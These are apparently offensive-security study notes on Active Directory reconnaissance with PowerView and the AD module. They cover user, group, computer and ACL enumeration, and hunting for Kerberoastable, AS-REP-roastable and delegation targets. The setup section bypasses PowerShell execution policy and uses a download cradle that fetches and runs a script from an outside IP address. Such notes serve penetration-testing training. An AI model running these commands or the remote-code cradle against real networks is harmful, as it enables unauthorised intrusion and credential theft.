# PowerView & AD Module
**Concept:** Instead of using noisy command-line tools like `net.exe` or `dsquery`, we use PowerShell to query the Domain Controller via LDAP. **Key Difference:**
- **PowerView:** Highly flexible, aggressive, built for attackers. Requires bypassing Execution Policy.
- **AD Module:** Signed by Microsoft, trusted, often whitelisted. Requires the DLL or RSAT installed.
## 1. Setup & Import
### PowerView (Dev/Share)
Usually run from memory (Download Cradle) or imported from disk if AV allows.
```powershell
# Bypass Execution Policy (Current Process)
Set-ExecutionPolicy -Scope Process Bypass

# Import from Disk
Import-Module .\PowerView.ps1

# Import from Memory (Cradle)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.18/PowerView.ps1')
```
### Active Directory Module
If RSAT is installed, it auto-loads. If not, you can drop the DLL (`Microsoft.ActiveDirectory.Management.dll`) and import it.
```powershell
# Import installed module
Import-Module ActiveDirectory

# Import from DLL (Living Off The Land)
Import-Module .\Microsoft.ActiveDirectory.Management.dll
```
## 2. Domain & Infrastructure Information

| **Discovery Goal**      | **PowerView Cmdlet**      | **AD Module Cmdlet**     |
| ----------------------- | ------------------------- | ------------------------ |
| *Domain Info*         | `Get-NetDomain`           | `Get-ADDomain`           |
| *Domain Controllers*  | `Get-NetDomainController` | `Get-ADDomainController` |
| *Forest Info*         | `Get-NetForest`           | `Get-ADForest`           |
| *Trust Relationships* | `Get-NetDomainTrust`      | `Get-ADTrust -Filter *`  |
**PowerView Example:**
```powershell
Get-NetDomain
Get-NetDomainController | select Name, IPAddress
```
## 3. User Enumeration
**Goal:** Find targets, admins, and descriptions containing passwords.
### PowerView (`Get-NetUser`)
```powershell
# Basic User Enum
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset

# Find accounts with "admin" in the name
Get-NetUser *admin* | select samaccountname

# Check for "Password" in Description field (High Value)
Get-NetUser | ? {$_.description -like "*pass*"} | select samaccountname, description
```
### AD Module (`Get-ADUser`)
```powershell
# Get all properties for a user
Get-ADUser -Identity "jsmith" -Properties *

# Filter enabled users containing "admin"
Get-ADUser -Filter 'Name -like "*admin*" -and Enabled -eq $true' -Properties Description | select Name, Description
```
## 4. Group Enumeration
**Goal:** Identify High-Value Groups (Domain Admins, Enterprise Admins) and their members.
### PowerView (`Get-NetGroup`)
```powershell
# List all groups
Get-NetGroup *admin*

# List members of "Domain Admins"
Get-NetGroupMember "Domain Admins" -Recurse

# Find which groups a specific user belongs to
Get-NetGroup -UserName "student1"
```
### AD Module (`Get-ADGroup`)
```powershell
# List members of Domain Admins
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Get group details
Get-ADGroup -Filter 'Name -like "*admin*"'
```
## 5. Computer Enumeration
**Goal:** Identify Operating Systems (Server vs Workstation) and potential targets for pivoting.
### PowerView (`Get-NetComputer`)
```powershell
# List all computers
Get-NetComputer

# Find Live Hosts (Ping Check)
Get-NetComputer -Ping

# Find Windows Server instances (Exclude workstations)
Get-NetComputer -OperatingSystem "*Server*"
```
### AD Module (`Get-ADComputer`)
```powershell
# List all computers with OS info
Get-ADComputer -Filter * -Properties OperatingSystem | select Name, OperatingSystem
```
## 6. Hunting for Vulnerabilities (Attacks)
**Goal:** Identify specific misconfigurations that lead to attacks like Kerberoasting or AS-REP Roasting.
### Finding Kerberoastable Users (SPNs)
Users with a `ServicePrincipalName` set can have their Kerberos TGS requested and cracked offline.
- **PowerView:** 
```powershell
    Get-NetUser -SPN | select samaccountname, serviceprincipalname
```
- **AD Module:**
```powershell
    Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
### Finding AS-REP Roastable Users (No Pre-Auth)
Users with "Do not require Kerberos preauthentication" enabled
- **PowerView:**
```powershell
    Get-NetUser -PreauthNotRequired
```
- **AD Module:**
```powershell
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```
### Finding Unconstrained Delegation (Pillaging)
Computers trusted for delegation can store TGTs of users who connect to them (waiting to be stolen via Mimikatz).
- **PowerView:**
```powershell
    Get-NetComputer -Unconstrained
```
- **AD Module:**
```powershell
    Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```
## 7. PowerView Exclusive Features (Situational Awareness)
These features perform active network scanning or complex logic that the standard AD Module does not support.
### Share Finder (Network Noise Alert)
Scans every computer in the domain for open SMB shares. Excellent for finding sensitive files.
```powershell
# Standard Scan
Invoke-ShareFinder -Verbose

# Exclude standard shares (C$, IPC$, print$)
Invoke-ShareFinder -CheckShareAccess -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
```
### User Hunter (Session Enumeration)
Finds where specific groups (like Domain Admins) are currently logged in. _Requires Local Admin on targets to enumerate sessions reliably._
```powershell
# Where are Domain Admins logged in?
Invoke-UserHunter -GroupName "Domain Admins" -CheckAccess
```
### ACL Enumeration (The "BloodHound" Logic)
Check if you can modify a user's password or add members to a group.
```powershell
# Check ACLs for a specific object
Get-ObjectAcl -Identity "Management_Group" -ResolveGUIDs

# Find interesting ACLs for the current user (What can I do?)
Invoke-ACLScanner -ResolveGUIDs
```